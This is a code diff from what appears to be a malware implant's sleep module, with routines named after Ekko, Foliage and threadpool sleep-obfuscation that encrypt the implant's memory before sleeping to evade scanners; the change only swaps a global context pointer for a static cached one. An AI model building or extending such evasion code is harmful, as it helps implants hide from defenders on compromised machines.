@@ -20,6 +20,10 @@
 
 static SLEEP_CONTEXT g_sleep_ctx;
 
+/* Static implant context pointer — set once in sleep_init, avoids
+   extern g_ctx references that generate .refptr entries */
+static IMPLANT_CONTEXT *s_sleep_impl_ctx = NULL;
+
 #ifdef TEST_BUILD
 static DWORD g_test_random_seed = 0;
 static BOOL  g_test_seed_set = FALSE;
@@ -392,8 +396,8 @@ NTSTATUS sleep_ekko(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 #ifdef TEST_BUILD
     /* In test builds, use memguard encrypt/decrypt cycle if available */
     EVASION_CONTEXT *ectx = NULL;
-    if (g_ctx.evasion_ctx)
-        ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     if (ectx && ectx->memguard.initialized) {
         NTSTATUS enc_status = memguard_encrypt(ectx);
@@ -414,8 +418,8 @@ NTSTATUS sleep_ekko(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 
     /* ---- Memory guard pre-sleep encryption ---- */
     EVASION_CONTEXT *ectx = NULL;
-    if (g_ctx.evasion_ctx)
-        ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     BOOL memguard_active = FALSE;
     if (ectx && ectx->memguard.initialized) {
@@ -674,8 +678,8 @@ NTSTATUS sleep_foliage(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 #ifdef TEST_BUILD
     /* In test builds, use memguard encrypt/decrypt cycle if available */
     EVASION_CONTEXT *ectx = NULL;
-    if (g_ctx.evasion_ctx)
-        ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     if (ectx && ectx->memguard.initialized) {
         NTSTATUS enc_status = memguard_encrypt(ectx);
@@ -701,8 +705,8 @@ NTSTATUS sleep_foliage(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 
     /* ---- Memory guard pre-sleep encryption ---- */
     EVASION_CONTEXT *ectx = NULL;
-    if (g_ctx.evasion_ctx)
-        ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     BOOL memguard_active = FALSE;
     if (ectx && ectx->memguard.initialized) {
@@ -950,8 +954,8 @@ NTSTATUS sleep_threadpool(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 #ifdef TEST_BUILD
     /* In test builds, use memguard encrypt/decrypt cycle if available */
     EVASION_CONTEXT *ectx = NULL;
-    if (g_ctx.evasion_ctx)
-        ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     if (ectx && ectx->memguard.initialized) {
         NTSTATUS enc_status = memguard_encrypt(ectx);
@@ -978,8 +982,8 @@ NTSTATUS sleep_threadpool(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 
     /* ---- Memory guard pre-sleep encryption ---- */
     EVASION_CONTEXT *ectx = NULL;
-    if (g_ctx.evasion_ctx)
-        ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     BOOL memguard_active = FALSE;
     if (ectx && ectx->memguard.initialized) {
@@ -1083,6 +1087,10 @@ NTSTATUS sleep_threadpool(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 NTSTATUS sleep_init(IMPLANT_CONTEXT *ctx) {
     if (!ctx)
         return STATUS_INVALID_PARAMETER;
+
+    /* Cache implant context pointer for sleep methods that need
+       evasion_ctx without an extern global */
+    s_sleep_impl_ctx = ctx;
 
     spec_memset(&g_sleep_ctx, 0, sizeof(SLEEP_CONTEXT));
 
